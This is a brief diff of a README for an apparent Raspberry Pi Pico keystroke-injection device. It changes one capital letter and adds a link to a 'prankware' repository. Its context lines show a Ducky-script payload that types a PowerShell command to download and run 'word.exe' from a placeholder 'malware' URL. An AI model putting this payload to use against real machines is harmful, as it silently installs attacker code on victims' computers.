@@ -2,7 +2,7 @@
 cp adafruit-circuitpython-raspberry_pi_pico-en_US-9.2.1.uf2 /path/to/RPI 
 ```
 
-wait for reboot
+Wait for reboot
 
 ```bash
 cp *.py /path/to/RPI
@@ -19,3 +19,5 @@ DELAY 500
 REM word.exe ;)
 STRING $f="$env:TEMP\word.exe"; iwr "https://domain.tld/damd/malware/uri" -o $f; &$f
 ```
+
+Check prankware repository <https://github.com/skylab-kulubu/seclendin>
